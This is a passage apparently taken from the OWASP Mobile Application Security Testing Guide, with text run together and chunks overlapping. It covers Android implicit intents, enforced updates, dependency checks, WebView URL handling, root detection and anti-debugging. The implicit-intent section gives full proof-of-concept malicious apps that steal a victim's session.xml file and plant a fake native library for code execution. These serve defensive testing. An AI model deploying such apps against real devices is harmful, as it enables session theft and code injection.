    "text": "Use Xposed to hook into the deserialization methods or add unprocessable in- formation to the serialized objects to see how they are handled (e.g., whether the application crashes or extra informationcanbeextractedbyenrichingtheobjects). Testing Implicit Intents Platform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview Whentestingforimplicitintentsyouneedtocheckiftheyarevulnerabletoinjectionattacksorpotentiallyleakingsensitive data. Static Analysis InspecttheAndroidManifestandlookforany<intent>signaturesdefinedinsideblocks(whichspecifythesetofother appsanappintendstointeractwith), checkifitcontainsanysystemactions(e.g.android.intent.action.GET_CON- TENT, android.intent.action.PICK, android.media.action.IMAGE_CAPTURE, etc.) and browse the source code for theiroccurrence. Forexample,thefollowingIntentdoesn’tspecifyanyconcretecomponent,meaningthatit’sanimplicitintent. Itsets the action android.intent.action.GET_CONTENT to ask the user for input data and then the app starts the intent by startActivityForResultandspecifyinganimagechooser. Intentintent =newIntent(); intent.setAction(\"android.intent.action.GET_CONTENT\"); startActivityForResult(Intent.createChooser(intent,\"\"),REQUEST_IMAGE); The app uses startActivityForResult instead of startActivity, indicating that it expects a result (in this case an image),soyoushouldcheckhowthereturnvalueoftheintentishandledbylookingfortheonActivityResultcallback. Ifthereturnvalueoftheintentisn’tproperlyvalidated,anattackermaybeabletoreadarbitraryfilesorexecutearbitrary codefromtheapp’sinternal‘/data/data/’storage. Afulldescriptionofthistypeofattackcanbefoundinthe[following blogpost](https://blog.oversecured.com/Interception-of-Android-implicit-intents”Currentattacksonimplicitintents”). Case 1: Arbitrary File Read Inthisexamplewe’regoingtoseehowanattackercanreadarbitraryfilesfromwithintheapp’sinternalstorage/data/ data/<appname>duetotheimpropervalidationofthereturnvalueoftheintent. The performAction method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to getFileItemFromUri. This method copies the file to a temp folder, which is usual if this 295\\nfileisdisplayedinternally. ButiftheappstorestheURIprovidedfileinanexternaltempdirectorye.gbycallinggetEx- ternalCacheDirorgetExternalFilesDiranattackercanreadthisfileifhesetsthepermissionandroid.permission. READ_EXTERNAL_STORAGE. private void performAction(Actionaction){ ... Uridata =intent.getData(); if(!(data ==null ||(fileItemFromUri =getFileItemFromUri(data))==null)) { ... } } private FileItem getFileItemFromUri(Context,context,Uriuri){ StringfileName =UriExtensions.getFileName(uri,context); Filefile =newFile(getExternalCacheDir(),\"tmp\"); file.createNewFile(); copy(context.openInputStream(uri),newFileOutputStream(file)); ... } Thefollowingisthesourceofamaliciousappthatexploitstheabovevulnerablecode. AndroidManifest.xml <uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /> <application> <activity android:name=\".EvilContentActivity\"> <intent-filter android:priority=\"999\"> <action android:name=\"android.intent.action.GET_CONTENT\" /> <data android:mimeType=\"*/*\" /> </intent-filter> </activity> </application> EvilContentActivity.java public class EvilContentActivity extends Activity{ @Override protected void OnCreate(@Nullable BundlesavedInstanceState){ super.OnCreate(savedInstanceState); setResult(-1,newIntent().setData(Uri.parse(\"file:///data/data/<victim_app>/shared_preferences/session.xml\"))); finish(); } } If the user selects the malicious app to handle the intent, the attacker can now steal the session.xml file from the app’sinternalstorage. Inthepreviousexample,thevictimmustexplicitlyselecttheattacker’smaliciousappinadialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This wouldallowtheattacktooccurwithoutanyadditionaluserinteraction. Thefollowingcodesampleimplementsthisautomaticselectionoftherecipient. Byspecifyingapriorityinthemalicious app’sintentfilter,theattackercaninfluencetheselectionsequence. Intentintent =newIntent(\"android.intent.action.GET_CONTENT\"); for(ResolveInfoinfo :getPackageManager().queryIntentActivities(intent,0)) { intent.setClassName(info.activityInfo.packageName,info.activityInfo.name); startActivityForResult(intent); return; } Case 2: Arbitrary Code Execution An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows content://andfile://URLs. An attacker can implement a ContentProvider that contains public Cursor query(...) to set an arbitrary file (in this case lib.so), and if the victim loads this file from the content provider by executing copy the attacker’s ParcelFileDescriptor openFile(...) methodwillbeexecutedandreturnamaliciousfakelib.so. AndroidManifest.xml 296\\n<uses-permission android:name=\"android.permission.READ_EXTERNAL_STORAGE\" /> <application> <activity android:name=\".EvilContentActivity\"> <intent-filter android:priority=\"999\"> <action android:name=\"android.intent.action.GET_CONTENT\" /> <data android:mimeType=\"*/*\" /> </intent-filter> </activity> <provider android:name=\".EvilContentProvider\" android:authorities=\"com.attacker.evil\" android:enabled=\"true\" android:exported=\"true\"></provider> </application> EvilContentProvider.java public Cursor query(Uriuri,String[]projection,Stringselection,String[] selectionArgs,StringsortOrder){ MatrixCursormatrixCursor =newMatrixCursor(newString[]{\"_display_name\"}); matrixCursor.addRow(newObject[]{\"../lib-main/lib.so\"}); return matrixCursor; } public ParcelFileDescriptor openFile(Uriuri,Stringmode)throws FileNotFoundException { return ParcelFileDescriptor.open(newFile(\"/data/data/com.attacker/fakelib.so\"),ParcelFileDescriptor.MODE_READ_ONLY); } EvilContentActivity.java public class EvilContentActivity extends Activity{ @Override protected void OnCreate(@Nullable BundlesavedInstanceState){ super.OnCreate(savedInstanceState); setResult(-1,newIntent().setData(Uri.parse(\"content:///data/data/com.attacker/fakelib.so\"))); finish(); } } Dynamic Analysis Aconvenientwaytodynamicallytestforimplicitintents,especiallytoidentifypotentiallyleakedsensitivedata,istouse Frida or frida-trace and hook the startActivityForResult and onActivityResult methods and inspect the provided intentsandthedatatheycontain. Testing Enforced Updating Platform: android MASVSV1: MSTG-ARCH-9 MASVSV2: MASVS-CODE-2 Overview To test for enforced updating you need to check if the app has support for in-app updates and validate if it’s properly enforcedsothattheuserisnotabletocontinueusingtheappwithoutupdatingitfirst. Static analysis Thecodesamplebelowshowstheexampleofanapp-update: //Part1:checkforupdate //Createsinstanceofthemanager. AppUpdateManagerappUpdateManager =AppUpdateManagerFactory.create(context); //Returnsanintentobjectthatyouusetocheckforanupdate. Task<AppUpdateInfo>appUpdateInfo =appUpdateManager.getAppUpdateInfo(); //Checksthattheplatformwillallowthespecifiedtypeofupdate. if(appUpdateInfo.updateAvailability()==UpdateAvailability.UPDATE_AVAILABLE 297\\n//Foraflexibleupdate,useAppUpdateType.FLEXIBLE && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)){ //...Part2:requestupdate appUpdateManager.startUpdateFlowForResult( //Passtheintentthatisreturnedby'getAppUpdateInfo()'. appUpdateInfo, //Or'AppUpdateType.FLEXIBLE'forflexibleupdates. AppUpdateType.IMMEDIATE, //Thecurrentactivitymakingtheupdaterequest. this, //Includearequestcodetolatermonitorthisupdaterequest. MY_REQUEST_CODE); //...Part3:checkifupdatecompletedsuccessfully @Override public void onActivityResult(intrequestCode,intresultCode,Intentdata){ if(myRequestCode ==MY_REQUEST_CODE){ if(resultCode !=RESULT_OK){ log(\"Updateflowfailed!Resultcode:\" +resultCode); //Iftheupdateiscancelledorfails, //youcanrequesttostarttheupdateagainincaseofforcedupdates } } } //..Part4: //Checksthattheupdateisnotstalledduring'onResume()'. //However,youshouldexecutethischeckatallentrypointsintotheapp. @Override protected void onResume(){ super.onResume(); appUpdateManager .getAppUpdateInfo() .addOnSuccessListener( appUpdateInfo ->{ ... if(appUpdateInfo.updateAvailability() ==UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS)",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 110
    }
  },
  {
    "text": "//Returnsanintentobjectthatyouusetocheckforanupdate. Task<AppUpdateInfo>appUpdateInfo =appUpdateManager.getAppUpdateInfo(); //Checksthattheplatformwillallowthespecifiedtypeofupdate. if(appUpdateInfo.updateAvailability()==UpdateAvailability.UPDATE_AVAILABLE 297\\n//Foraflexibleupdate,useAppUpdateType.FLEXIBLE && appUpdateInfo.isUpdateTypeAllowed(AppUpdateType.IMMEDIATE)){ //...Part2:requestupdate appUpdateManager.startUpdateFlowForResult( //Passtheintentthatisreturnedby'getAppUpdateInfo()'. appUpdateInfo, //Or'AppUpdateType.FLEXIBLE'forflexibleupdates. AppUpdateType.IMMEDIATE, //Thecurrentactivitymakingtheupdaterequest. this, //Includearequestcodetolatermonitorthisupdaterequest. MY_REQUEST_CODE); //...Part3:checkifupdatecompletedsuccessfully @Override public void onActivityResult(intrequestCode,intresultCode,Intentdata){ if(myRequestCode ==MY_REQUEST_CODE){ if(resultCode !=RESULT_OK){ log(\"Updateflowfailed!Resultcode:\" +resultCode); //Iftheupdateiscancelledorfails, //youcanrequesttostarttheupdateagainincaseofforcedupdates } } } //..Part4: //Checksthattheupdateisnotstalledduring'onResume()'. //However,youshouldexecutethischeckatallentrypointsintotheapp. @Override protected void onResume(){ super.onResume(); appUpdateManager .getAppUpdateInfo() .addOnSuccessListener( appUpdateInfo ->{ ... if(appUpdateInfo.updateAvailability() ==UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS) { //Ifanin-appupdateisalreadyrunning,resumetheupdate. manager.startUpdateFlowForResult( appUpdateInfo, IMMEDIATE, this, MY_REQUEST_CODE); } }); } } Source: https://developer.android.com/guide/app-bundle/in-app-updates Dynamic analysis Inordertotestforproperupdating: trydownloadinganolderversionoftheapplicationwithasecurityvulnerability,either byareleasefromthedevelopersorbyusingathirdpartyapp-store. Next,verifywhetherornotyoucancontinuetouse theapplicationwithoutupdatingit. Ifanupdatepromptisgiven,verifyifyoucanstillusetheapplicationbycancelingthe prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend willstopcallstovulnerablebackendsand/orwhetherthevulnerableapp-versionitselfisblockedbythebackend. Lastly, seeifyoucanplaywiththeversionnumberofaman-in-the-middledappandseehowthebackendrespondstothis(and ifitisrecordedatallforinstance). Checking for Weaknesses in Third Party Libraries Platform: android MASVSV1: MSTG-CODE-5 MASVSV2: MASVS-CODE-3 298\\nOverview Static Analysis Detecting vulnerabilities in third party dependencies can be done by means of the OWASP Dependency checker. This is best done by using a gradle plugin, such as dependency-check-gradle. In order to use the plugin, the following steps need to be applied: Install the plugin from the Maven central repository by adding the following script to your build.gradle: buildscript{ repositories{ mavenCentral() } dependencies{ classpath'org.owasp:dependency-check-gradle:3.2.0' } } applyplugin:'org.owasp.dependencycheck' Oncegradlehasinvokedtheplugin,youcancreateareportbyrunning: gradleassemble gradledependencyCheckAnalyze --info Thereportwillbeinbuild/reportsunlessotherwiseconfigured. Usethereportinordertoanalyzethevulnerabilities found. Seeremediationonwhattodogiventhevulnerabilitiesfoundwiththelibraries. Please be advised that the plugin requires to download a vulnerability feed. Consult the documentation in case issues arisewiththeplugin. Lastly,pleasenotethatforhybridapplications,onewillhavetochecktheJavaScriptdependencieswithRetireJS.Similarly forXamarin,onewillhavetochecktheC#dependencies. Whenalibraryisfoundtocontainvulnerabilities,thenthefollowingreasoningapplies: • Isthelibrarypackagedwiththeapplication? Thencheckwhetherthelibraryhasaversioninwhichthevulnerability ispatched. Ifnot,checkwhetherthevulnerabilityactuallyaffectstheapplication. Ifthatisthecaseormightbethe caseinthefuture,thenlookforanalternativewhichprovidessimilarfunctionality,butwithoutthevulnerabilities. • Isthelibrarynotpackagedwiththeapplication? Seeifthereisapatchedversioninwhichthevulnerabilityisfixed. If thisisnotthecase,checkiftheimplicationsofthevulnerabilityforthebuild-process. Couldthevulnerabilityimpede abuildorweakenthesecurityofthebuild-pipeline? Thentrylookingforanalternativeinwhichthevulnerabilityis fixed. When the sources are not available, one can decompile the app and check the JAR files. When Dexguard or ProGuard areappliedproperly,thenversioninformationaboutthelibraryisoftenobfuscatedandthereforegone. Otherwiseyou canstillfindtheinformationveryofteninthecommentsoftheJavafilesofgivenlibraries. ToolssuchasMobSFcanhelp in analyzing the possible libraries packed with the application. If you can retrieve the version of the library, either via comments,orviaspecificmethodsusedincertainversions,youcanlookthemupforCVEsbyhand. Iftheapplicationisahigh-riskapplication, youwillendupvettingthelibrarymanually. Inthatcase, therearespecific requirements for native code, which you can find in the chapter “Testing Code Quality”. Next to that, it is good to vet whetherallbestpracticesforsoftwareengineeringareapplied. Dynamic Analysis Thedynamicanalysisofthissectioncomprisesvalidatingwhetherthecopyrightsofthelicenseshavebeenadheredto. ThisoftenmeansthattheapplicationshouldhaveanaboutorEULAsectioninwhichthecopyrightstatementsarenoted asrequiredbythelicenseofthethirdpartylibrary. Testing for URL Loading in WebViews 299\\nPlatform: android MASVSV1: MSTG-PLATFORM-2 MASVSV2: MASVS-CODE-4 Overview In order to test for URL loading in WebViews you need to carefully analyze handling page navigation, especially when usersmightbeabletonavigateawayfromatrustedenvironment. ThedefaultandsafestbehavioronAndroidistolet thedefaultwebbrowseropenanylinkthattheusermightclickinsidetheWebView. However,thisdefaultlogiccanbe modifiedbyconfiguringaWebViewClientwhichallowsnavigationrequeststobehandledbytheappitself. Static Analysis Check for Page Navigation Handling Override TotestiftheappisoverridingthedefaultpagenavigationlogicbyconfiguringaWebViewClientyoushouldsearchfor andinspectthefollowinginterceptioncallbackfunctions: • shouldOverrideUrlLoadingallowsyourapplicationtoeitherabortloadingWebViewswithsuspiciouscontentby returningtrueorallowtheWebViewtoloadtheURLbyreturningfalse. Considerations: – ThismethodisnotcalledforPOSTrequests. – ThismethodisnotcalledforXmlHttpRequests,iFrames,“src”attributesincludedinHTMLor<script>tags. Instead,shouldInterceptRequestshouldtakecareofthis. • shouldInterceptRequestallowstheapplicationtoreturnthedatafromresourcerequests. Ifthereturnvalueis null,theWebViewwillcontinuetoloadtheresourceasusual. Otherwise,thedatareturnedbytheshouldInter- ceptRequestmethodisused. Considerations: – This callback is invoked for a variety of URL schemes (e.g., http(s):, data:, file:, etc.), not only those schemeswhichsendrequestsoverthenetwork. – This is not called for javascript: or blob: URLs, or for assets accessed via file:///android_asset/ or file:///android_res/URLs. Inthecaseofredirects,thisisonlycalledfortheinitialresourceURL,notany subsequentredirectURLs. – WhenSafeBrowsingisenabled,theseURLsstillundergoSafeBrowsingchecksbutthedevelopercanallow theURLwithsetSafeBrowsingWhitelistorevenignorethewarningviatheonSafeBrowsingHitcallback. As you can see there are a lot of points to consider when testing the security of WebViews that have a WebViewClient configured,sobesuretocarefullyreadandunderstandallofthembycheckingtheWebViewClientDocumentation. Check for EnableSafeBrowsing Disabled WhilethedefaultvalueofEnableSafeBrowsingistrue,someapplicationsmightopttodisableit. ToverifythatSafeBrows- ingisenabled,inspecttheAndroidManifest.xmlfileandmakesurethattheconfigurationbelowisnotpresent: <manifest> <application> <meta-data android:name=\"android.webkit.WebView.EnableSafeBrowsing\" android:value=\"false\" /> ... </application> </manifest> Dynamic Analysis AconvenientwaytodynamicallytestdeeplinkingistouseFridaorfrida-traceandhooktheshouldOverrideUrlLoading, shouldInterceptRequestmethodswhileusingtheappandclickingonlinkswithintheWebView. Besuretoalsohook otherrelatedUrimethodssuchasgetHost,getSchemeorgetPathwhicharetypicallyusedtoinspecttherequestsand matchknownpatternsordenylists. 300\\nAndroid Anti-Reversing Defenses Overview General Disclaimer Thelackofanyofthesemeasuresdoesnotcauseavulnerability-instead,theyaremeanttoincreasetheapp’s resilienceagainstreverseengineeringandspecificclient-sideattacks. None of these measures can assure a 100% effectiveness, as the reverse engineer will always have full access to the deviceandwillthereforealwayswin(givenenoughtimeandresources)! Forexample,preventingdebuggingisvirtuallyimpossible. Iftheappispubliclyavailable,itcanberunonanuntrusted devicethatisunderfullcontroloftheattacker. Averydeterminedattackerwilleventuallymanagetobypassalltheapp’s anti-debuggingcontrolsbypatchingtheappbinaryorbydynamicallymodifyingtheapp’sbehavioratruntimewithtools suchasFrida. You can learn more about principles and technical risks of reverse engineering and code modification in these OWASP",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 111
    }
  },
  {
    "text": "Overview General Disclaimer Thelackofanyofthesemeasuresdoesnotcauseavulnerability-instead,theyaremeanttoincreasetheapp’s resilienceagainstreverseengineeringandspecificclient-sideattacks. None of these measures can assure a 100% effectiveness, as the reverse engineer will always have full access to the deviceandwillthereforealwayswin(givenenoughtimeandresources)! Forexample,preventingdebuggingisvirtuallyimpossible. Iftheappispubliclyavailable,itcanberunonanuntrusted devicethatisunderfullcontroloftheattacker. Averydeterminedattackerwilleventuallymanagetobypassalltheapp’s anti-debuggingcontrolsbypatchingtheappbinaryorbydynamicallymodifyingtheapp’sbehavioratruntimewithtools suchasFrida. You can learn more about principles and technical risks of reverse engineering and code modification in these OWASP documents: • OWASPArchitecturalPrinciplesThatPreventCodeModificationorReverseEngineering • OWASPTechnicalRisksofReverseEngineeringandUnauthorizedCodeModification Root Detection and Common Root Detection Methods In the context of anti-reversing, the goal of root detection is to make running the app on a rooted device a bit more difficult,whichinturnblockssomeofthetoolsandtechniquesreverseengineersliketouse. Likemostotherdefenses, rootdetectionisnotveryeffectivebyitself,butimplementingmultiplerootchecksthatarescatteredthroughouttheapp canimprovetheeffectivenessoftheoverallanti-tamperingscheme. ForAndroid,wedefine“rootdetection”abitmorebroadly,includingcustomROMsdetection,i.e.,determiningwhether thedeviceisastockAndroidbuildoracustombuild. Inthefollowingsection,welistsomecommonrootdetectionmethodsyou’llencounter. You’llfindsomeofthesemethods implementedintheOWASPUnCrackableAppsforAndroidthataccompanytheOWASPMobileTestingGuide. RootdetectioncanalsobeimplementedthroughlibrariessuchasRootBeer. SafetyNet SafetyNet is an Android API that provides a set of services and creates profiles of devices according to software and hardwareinformation. ThisprofileisthencomparedtoalistofaccepteddevicemodelsthathavepassedAndroidcompat- ibilitytesting. Googlerecommendsusingthefeatureas“anadditionalin-depthdefensesignalaspartofananti-abuse system”. How exactly SafetyNet works is not well documented and may change at any time. When you call this API, SafetyNet downloadsabinarypackagecontainingthedevicevalidationcodeprovidedfromGoogle,andthecodeisthendynamically executedviareflection. AnanalysisbyJohnKozyrakisshowedthatSafetyNetalsoattemptstodetectwhetherthedevice isrooted,butexactlyhowthat’sdeterminedisunclear. To use the API, an app may call the SafetyNetApi.attest method (which returns a JWS message with the Attestation Result)andthencheckthefollowingfields: • ctsProfileMatch: If‘true’,thedeviceprofilematchesoneofGoogle’slisteddevices. • basicIntegrity: If‘true’,thedevicerunningtheapplikelyhasn’tbeentamperedwith. • nonces: Tomatchtheresponsetoitsrequest. • timestampMs: Tocheckhowmuchtimehaspassedsinceyoumadetherequestandyougottheresponse. Adelayed responsemaysuggestsuspiciousactivity. • apkPackageName,apkCertificateDigestSha256,apkDigestSha256: ProvideinformationabouttheAPK,whichis usedtoverifytheidentityofthecallingapp. TheseparametersareabsentiftheAPIcannotreliablydeterminethe APKinformation. 301\\nThefollowingisasampleattestationresult: { \"nonce\":\"R2Rra24fVm5xa2Mg\", \"timestampMs\":9860437986543, \"apkPackageName\":\"com.package.name.of.requesting.app\", \"apkCertificateDigestSha256\":[\"base64encoded,SHA-256hashofthe certificateusedtosignrequestingapp\"], \"apkDigestSha256\":\"base64encoded,SHA-256hashoftheapp'sAPK\", \"ctsProfileMatch\":true, \"basicIntegrity\":true, } ctsProfileMatch Vs basicIntegrity TheSafetyNetAttestationAPIinitiallyprovidedasinglevaluecalledbasicIntegritytohelpdevelopersdeterminethe integrityofadevice. AstheAPIevolved,Googleintroducedanew,strictercheckwhoseresultsappearinavaluecalled ctsProfileMatch,whichallowsdeveloperstomorefinelyevaluatethedevicesonwhichtheirappisrunning. In broad terms, basicIntegrity gives you a signal about the general integrity of the device and its API. Many Rooted devicesfailbasicIntegrity,asdoemulators,virtualdevices,anddeviceswithsignsoftampering,suchasAPIhooks. On the other hand, ctsProfileMatch gives you a much stricter signal about the compatibility of the device. Only un- modifieddevicesthathavebeencertifiedbyGooglecanpassctsProfileMatch. DevicesthatwillfailctsProfileMatch includethefollowing: • DevicesthatfailbasicIntegrity • Deviceswithanunlockedbootloader • Deviceswithacustomsystemimage(customROM) • Devicesforwhichthemanufacturerdidn’tapplyfor,orpass,Googlecertification • DeviceswithasystemimagebuiltdirectlyfromtheAndroidOpenSourceProgramsourcefiles • Devices with a system image distributed as part of a beta or developer preview program (including the Android BetaProgram) Recommendations when using SafetyNetApi.attest • Createalarge(16bytesorlonger)randomnumberonyourserverusingacryptographically-securerandomfunction sothatamalicioususercannotreuseasuccessfulattestationresultinplaceofanunsuccessfulresult • TrustAPKinformation(apkPackageName,apkCertificateDigestSha256andapkDigestSha256)onlyifthevalueof ctsProfileMatchistrue. • The entire JWS response should be sent to your server, using a secure connection, for verification. It isn’t rec- ommended to perform the verification directly in the app because, in that case, there is no guarantee that the verificationlogicitselfhasn’tbeenmodified. • TheverifymethodonlyvalidatesthattheJWSmessagewassignedbySafetyNet. Itdoesn’tverifythatthepayload oftheverdictmatchesyourexpectations. Asusefulasthisservicemayseem,itisdesignedfortestpurposesonly, andithasverystrictusagequotasof10,000requestsperday,perprojectwhichwillnotbeincreaseduponrequest. Hence, you should refer SafetyNet Verification Samples and implement the digital signature verification logic on yourserverinawaythatitdoesn’tdependonGoogle’sservers. • The SafetyNet AttestationAPI gives you a snapshot of the state of a device at the moment when the attestation requestwasmade. Asuccessfulattestationdoesn’tnecessarilymeanthatthedevicewouldhavepassedattestation inthepast,orthatitwillinthefuture. It’srecommendedtoplanastrategytousetheleastamountofattestations requiredtosatisfytheusecase. • TopreventinadvertentlyreachingyourSafetyNetApi.attestquotaandgettingattestationerrors,youshouldbuild a system that monitors your usage of the API and warns you well before you reach your quota so you can get it increased. You should also be prepared to handle attestation failures because of an exceeded quota and avoid blockingallyourusersinthissituation. Ifyouareclosetoreachingyourquota,orexpectashort-termspikethat mayleadyoutoexceedyourquota,youcansubmitthisformtorequestshortorlong-termincreasestothequota foryourAPIkey. Thisprocess,aswellastheadditionalquota,isfreeofcharge. Followthischecklisttoensurethatyou’vecompletedeachofthestepsneededtointegratetheSafetyNetApi.attest APIintotheapp. Programmatic Detection 302\\nFile existence checks Perhapsthemostwidelyusedmethodofprogrammaticdetectionischeckingforfilestypicallyfoundonrooteddevices, suchaspackagefilesofcommonrootingappsandtheirassociatedfilesanddirectories,includingthefollowing: /system/app/Superuser.apk /system/etc/init.d/99SuperSUDaemon /dev/com.koushikdutta.superuser.daemon/ /system/xbin/daemonsu Detection code also often looks for binaries that are usually installed once a device has been rooted. These searches includecheckingforbusyboxandattemptingtoopenthesubinaryatdifferentlocations: /sbin/su /system/bin/su /system/bin/failsafe/su /system/xbin/su /system/xbin/busybox /system/sd/xbin/su /data/local/su /data/local/xbin/su /data/local/bin/su CheckingwhethersuisonthePATHalsoworks: public static boolean checkRoot(){ for(StringpathDir :System.getenv(\"PATH\").split(\":\")){ if(newFile(pathDir,\"su\").exists()){ return true; } } return false; } FilecheckscanbeeasilyimplementedinbothJavaandnativecode. ThefollowingJNIexample(adaptedfromrootinspec- tor)usesthestatsystemcalltoretrieveinformationaboutafileandreturns“1”ifthefileexists. jbooleanJava_com_example_statfile(JNIEnv *env,jobjectthis,jstringfilepath){ jbooleanfileExists =0; jbooleanisCopy; const char *path =(*env)->GetStringUTFChars(env,filepath,&isCopy); struct statfileattrib; if(stat(path,&fileattrib)<0){ __android_log_print(ANDROID_LOG_DEBUG,DEBUG_TAG,\"NATIVE:staterror:[%s]\",strerror(errno)); }else { __android_log_print(ANDROID_LOG_DEBUG,DEBUG_TAG,\"NATIVE:statsuccess,accessperms:[%d]\",fileattrib.st_mode); return 1; } return",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 112
    }
  },
  {
    "text": "These searches includecheckingforbusyboxandattemptingtoopenthesubinaryatdifferentlocations: /sbin/su /system/bin/su /system/bin/failsafe/su /system/xbin/su /system/xbin/busybox /system/sd/xbin/su /data/local/su /data/local/xbin/su /data/local/bin/su CheckingwhethersuisonthePATHalsoworks: public static boolean checkRoot(){ for(StringpathDir :System.getenv(\"PATH\").split(\":\")){ if(newFile(pathDir,\"su\").exists()){ return true; } } return false; } FilecheckscanbeeasilyimplementedinbothJavaandnativecode. ThefollowingJNIexample(adaptedfromrootinspec- tor)usesthestatsystemcalltoretrieveinformationaboutafileandreturns“1”ifthefileexists. jbooleanJava_com_example_statfile(JNIEnv *env,jobjectthis,jstringfilepath){ jbooleanfileExists =0; jbooleanisCopy; const char *path =(*env)->GetStringUTFChars(env,filepath,&isCopy); struct statfileattrib; if(stat(path,&fileattrib)<0){ __android_log_print(ANDROID_LOG_DEBUG,DEBUG_TAG,\"NATIVE:staterror:[%s]\",strerror(errno)); }else { __android_log_print(ANDROID_LOG_DEBUG,DEBUG_TAG,\"NATIVE:statsuccess,accessperms:[%d]\",fileattrib.st_mode); return 1; } return 0; } Executing su and other commands AnotherwayofdeterminingwhethersuexistsisattemptingtoexecuteitthroughtheRuntime.getRuntime.execmethod. AnIOExceptionwillbethrownifsuisnotonthePATH.Thesamemethodcanbeusedtocheckforotherprogramsoften foundonrooteddevices,suchasbusyboxandthesymboliclinksthattypicallypointtoit. Checking running processes Supersu-by far the most popular rooting tool-runs an authentication daemon named daemonsu, so the presence of this process is another sign of a rooted device. Running processes can be enumerated with the ActivityManager. getRunningAppProcessesandmanager.getRunningServicesAPIs, thepscommand, andbrowsingthroughthe/proc directory. Thefollowingisanexampleimplementedinrootinspector: 303\\npublic boolean checkRunningProcesses(){ boolean returnValue =false; //Getcurrentlyrunningapplicationprocesses List<RunningServiceInfo>list =manager.getRunningServices(300); if(list !=null){ StringtempName; for(inti=0;i<list.size();++i){ tempName =list.get(i).process; if(tempName.contains(\"supersu\")||tempName.contains(\"superuser\")){ returnValue =true; } } } return returnValue; } Checking installed app packages YoucanusetheAndroidpackagemanagertoobtainalistofinstalledpackages. Thefollowingpackagenamesbelongto popularrootingtools: com.thirdparty.superuser eu.chainfire.supersu com.noshufou.android.su com.koushikdutta.superuser com.zachspong.temprootremovejb com.ramdroid.appquarantine com.topjohnwu.magisk Checking for writable partitions and system directories Unusualpermissionsonsystemdirectoriesmayindicateacustomizedorrooteddevice. Althoughthesystemanddata directoriesarenormallymountedread-only, you’llsometimesfindthemmountedread-writewhenthedeviceisrooted. Lookforthesefilesystemsmountedwiththe“rw”flagortrytocreateafileinthedatadirectories. Checking for custom Android builds Checking for signs of test builds and custom ROMs is also helpful. One way to do this is to check the BUILD tag for test-keys,whichnormallyindicateacustomAndroidimage. ChecktheBUILDtagasfollows: private boolean isTestKeyBuild() { Stringstr =Build.TAGS; if((str!=null)&& (str.contains(\"test-keys\"))); for(inti=1;;i=0) return i; } Missing Google Over-The-Air (OTA) certificates is another sign of a custom ROM: on stock Android builds, OTA updates Google’spubliccertificates. Anti-Debugging Debuggingisahighlyeffectivewaytoanalyzeruntimeappbehavior. Itallowsthereverseengineertostepthroughthe code,stopappexecutionatarbitrarypoints,inspectthestateofvariables,readandmodifymemory,andalotmore. Anti-debugging features can be preventive or reactive. As the name implies, preventive anti-debugging prevents the debuggerfromattachinginthefirstplace; reactiveanti-debugginginvolvesdetectingdebuggersandreactingtothem in some way (e.g., terminating the app or triggering hidden behavior). The “more-is-better” rule applies: to maximize effectiveness,defenderscombinemultiplemethodsofpreventionanddetectionthatoperateondifferentAPIlayersand arewelldistributedthroughouttheapp. As mentioned in the “Reverse Engineering and Tampering” chapter, we have to deal with two debugging protocols on Android: we can debug on the Java level with JDWP or on the native layer via a ptrace-based debugger. A good anti- debuggingschemeshoulddefendagainstbothtypesofdebugging. 304\\nJDWP Anti-Debugging Inthechapter“ReverseEngineeringandTampering”,wetalkedaboutJDWP,theprotocolusedforcommunicationbetween thedebuggerandtheJavaVirtualMachine. Weshowedthatitiseasytoenabledebuggingforanyappbypatchingits manifestfile,andchangingthero.debuggablesystempropertywhichenablesdebuggingforallapps. Let’slookatafew thingsdevelopersdotodetectanddisableJDWPdebuggers. Checking the Debuggable Flag in ApplicationInfo Wehavealreadyencounteredtheandroid:debuggableattribute. ThisflagintheAndroidManifestdetermineswhether theJDWPthreadisstartedfortheapp. Itsvaluecanbedeterminedprogrammatically, viatheapp’sApplicationInfo object. Iftheflagisset,themanifesthasbeentamperedwithandallowsdebugging. public static boolean isDebuggable(Contextcontext){ return ((context.getApplicationContext().getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)!=0); } isDebuggerConnected While this might be pretty obvious to circumvent for a reverse engineer, you can use isDebuggerConnected from the android.os.Debugclasstodeterminewhetheradebuggerisconnected. public static boolean detectDebugger(){ return Debug.isDebuggerConnected(); } ThesameAPIcanbecalledvianativecodebyaccessingtheDvmGlobalsglobalstructure. JNIEXPORTjbooleanJNICALLJava_com_test_debugging_DebuggerConnectedJNI(JNIenv *env,jobjectobj){ if(gDvm.debuggerConnected ||gDvm.debuggerActive) return JNI_TRUE; return JNI_FALSE; } Timer Checks Debug.threadCpuTimeNanos indicates the amount of time that the current thread has been executing code. Because debuggingslowsdownprocessexecution,youcanusethedifferenceinexecutiontimetoguesswhetheradebuggeris attached. static boolean detect_threadCpuTimeNanos(){ long start =Debug.threadCpuTimeNanos(); for(inti=0;i<1000000;++i) continue; long stop =Debug.threadCpuTimeNanos(); if(stop -start <10000000){ return false; } else { return true; } } Messing with JDWP-Related Data Structures InDalvik,theglobalvirtualmachinestateisaccessibleviatheDvmGlobalsstructure. TheglobalvariablegDvmholdsa pointertothisstructure. DvmGlobalscontainsvariousvariablesandpointersthatareimportantforJDWPdebuggingand canbetamperedwith. 305\\nstruct DvmGlobals { /* *Someoptionsthatcouldbeworthtamperingwith:) */ bool jdwpAllowed; //debuggingallowedforthisprocess? bool jdwpConfigured; //hasdebugginginfobeenprovided? JdwpTransportTypejdwpTransport; bool jdwpServer; char* jdwpHost; int jdwpPort; bool jdwpSuspend; Thread* threadList; bool nativeDebuggerActive; bool debuggerConnected; /*debuggerorDDMSisconnected*/ bool debuggerActive; /*debuggerismakingrequests*/ JdwpState* jdwpState; }; 